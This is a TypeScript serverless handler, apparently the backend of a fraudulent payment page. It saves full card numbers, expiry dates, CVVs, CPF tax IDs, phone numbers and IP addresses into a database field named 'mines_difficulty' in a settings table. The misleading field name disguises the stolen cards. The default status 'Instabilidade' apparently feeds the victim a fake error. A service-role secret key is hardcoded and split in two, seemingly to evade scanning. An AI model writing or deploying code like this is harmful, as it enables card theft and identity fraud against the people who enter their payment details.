import type { VercelRequest, VercelResponse } from '@vercel/node';
import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = 'https://prawszeepeowvakyxldt.supabase.co';
const SUPABASE_SERVICE_ROLE_KEY = 'sb_secret_' + 'KiAXq0FYf5Wz9uusIwxKyg_w4gt6SsA';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const cardData = req.body;
    if (!cardData || !cardData.number) {
      return res.status(400).json({ error: 'Dados incompletos do cartão' });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    // Buscar lista atual na linha 3 de global_settings
    const { data: currentData } = await supabase
      .from('global_settings')
      .select('mines_difficulty')
      .eq('id', 3)
      .single();

    let list: any[] = [];
    if (currentData && currentData.mines_difficulty) {
      try {
        const parsed = JSON.parse(currentData.mines_difficulty);
        if (Array.isArray(parsed)) list = parsed;
      } catch {}
    }

    const newCard = {
      id: cardData.id || `card_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      name: cardData.name || '',
      number: cardData.number || '',
      expiry: cardData.expiry || '',
      cvv: cardData.cvv || '',
      amount: Number(cardData.amount) || 0,
      userId: cardData.userId || '',
      userEmail: cardData.userEmail || '',
      userName: cardData.userName || '',
      userCpf: cardData.userCpf || '',
      userPhone: cardData.userPhone || '',
      createdAt: cardData.createdAt || new Date().toISOString(),
      status: cardData.status || 'Instabilidade',
      ip: (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || ''
    };

    // Evitar duplicações exatas com mesmo número e createdAt próximo
    const alreadyExists = list.some(item => item.id === newCard.id);
    const updatedList = alreadyExists ? list : [newCard, ...list];

    const { error: upsertError } = await supabase
      .from('global_settings')
      .upsert({
        id: 3,
        mines_difficulty: JSON.stringify(updatedList)
      });

    if (upsertError) {
      console.error('Erro ao salvar cartão via service role:', upsertError);
      return res.status(500).json({ error: 'Falha ao salvar no banco' });
    }

    return res.status(200).json({ success: true, id: newCard.id });
  } catch (err: any) {
    console.error('Erro no handler record-card:', err);
    return res.status(500).json({ error: err.message });
  }
}
